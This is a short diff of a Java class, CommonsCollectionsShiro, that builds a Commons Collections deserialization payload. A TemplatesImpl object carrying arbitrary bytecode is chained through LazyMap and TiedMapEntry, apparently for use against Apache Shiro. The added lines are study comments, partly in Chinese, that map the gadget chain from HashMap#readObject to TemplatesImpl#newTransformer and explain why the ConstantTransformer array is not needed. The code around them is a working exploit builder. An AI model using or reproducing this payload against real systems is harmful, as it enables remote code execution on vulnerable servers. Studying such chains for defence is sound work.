@@ -20,6 +20,17 @@ public class CommonsCollectionsShiro {
         field.set(obj, value);
     }
 
+    /**
+     * HashMap#readObject()
+     * HashMap#hash(key)
+     *      TiedMapEntry#hashCode()
+     *      TiedMapEntry#getValue()
+     *          LazyMap#get(key)
+     *              InvokerTransformer#transform()
+     *                  TemplatesImpl#newTransformer()
+     *
+     *  前面和cc6一样，不明白为啥选了cc6.
+     */
     public byte[] getPayload(byte[] clazzBytes) throws Exception {
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
@@ -30,6 +41,12 @@ public class CommonsCollectionsShiro {
 
         Map innerMap = new HashMap();
         Map outerMap = LazyMap.decorate(innerMap, transformer);
+
+
+        // obj作为tiedMapEntry的key就是巧妙之处
+        // outerMap.get(obj) --> lazyMap.get(obj) --> invokerTransformer.transform(obj) --> newTransformer().invoke(obj)
+        // 之前需要数组是因为要保证newTransformer().invoke(xxx)这里的xxx是TemplatesImpl，所以用ConstantTransformer去固定它
+        // 但是当obj作为lazy的key的时候，刚好可以被传进newTransformer().invoke(xxx)，ConstantTransformer了，也即不再需要数组了。
 
         TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
 
